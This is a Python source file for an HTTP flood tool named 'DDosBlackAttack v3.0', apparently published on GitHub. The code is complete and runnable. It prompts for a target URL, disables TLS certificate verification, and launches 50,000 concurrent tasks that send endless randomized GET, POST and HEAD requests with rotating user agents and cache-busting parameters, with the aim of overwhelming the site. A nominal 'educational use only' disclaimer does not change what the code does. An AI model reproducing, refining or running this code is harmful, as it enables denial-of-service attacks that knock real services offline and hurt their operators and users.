# DDosBlackAttack v3.0
# Developer: Safwan Al-Sadaf
# GitHub: https://github.com/Safwan146
# License: For Educational Use Only
# Note: The developer is not responsible for any misuse.
# Quote: "When SQLi strikes silently, databases scream without a sound."

import asyncio
import random
import ssl
import sys
import os
from aiohttp import ClientSession, TCPConnector
from urllib.parse import quote

class DDosBlackAttack:
    def __init__(self):
        self.target_url = ""
        self.host_ip = ""
        self.threads = 50000
        self.running = True
        self.methods = ['GET', 'POST', 'HEAD']
        self.user_agents = [f"Mozilla/5.0 (BlackBot/{i})" for i in range(1, 5001)]
        self.ssl_ctx = self.create_ssl_context()

    def create_ssl_context(self):
        ctx = ssl.create_default_context()
        ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def clear_screen(self):
        os.system('clear' if os.name != 'nt' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print("""\033[1;92m
____         __                     
 / ___|  __ _ / _|_      ____ _ _ __  
 \___ \ / _` | |_\ \ /\ / / _` | '_ \ 
  ___) | (_| |  _|\ V  V / (_| | | | |
 |____/ \__,_|_|   \_/\_/ \__,_|_| |_|

-------------------------------------------------
☠️   Tool : DDosBlackAttack v3.0
☠️   Mode : Random (GET | POST | HEAD)
☠️   Threads : 50,000 | Users : 5,000
☠️   Proxy : VPN (user-controlled)
🎭   Developer : Safwan Al-Sadaf
-------------------------------------------------
⚔️ Quote: "When SQLi strikes silently, databases scream without a sound."
-------------------------------------------------
🔥  Disclaimer:
This tool is made for educational and testing purposes only.
The developer is NOT responsible for any misuse of this tool.
\033[0m""")

    def setup(self):
        self.show_banner()
        self.target_url = input("[+] Enter target website URL: ").strip()
        self.host_ip = input("[+] Enter target host IP address: ").strip()

    def generate_junk(self):
        return quote(f'_={random.randint(10000,999999)}&cache={random.random()}')

    def generate_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }

    async def http_flood(self, session, method):
        while self.running:
            try:
                async with session.request(
                    method=method,
                    url=f"{self.target_url}?{self.generate_junk()}",
                    timeout=10
                ) as response:
                    await response.read()
                    print(f"\033[1;32m[✓] {method} {response.status} -> Success\033[0m")
            except Exception:
                print(f"\033[1;31m[✗] {method} -> Failed\033[0m")
                continue

    async def attack_loop(self):
        connector = TCPConnector(ssl=self.ssl_ctx, limit=self.threads)
        tasks = []
        headers = self.generate_headers()
        async with ClientSession(connector=connector, headers=headers) as session:
            for _ in range(self.threads):
                method = random.choice(self.methods)
                tasks.append(self.http_flood(session, method))
            await asyncio.gather(*tasks)

    def run(self):
        self.setup()
        print("\n[✓] Attack Started! Live stats below... (Press Ctrl+C to stop)\n")
        try:
            asyncio.run(self.attack_loop())
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Attack Stopped by user.")
        print("\n[✓] Attack Finished ✅")

if __name__ == "__main__":
    tool = DDosBlackAttack()
    tool.run()
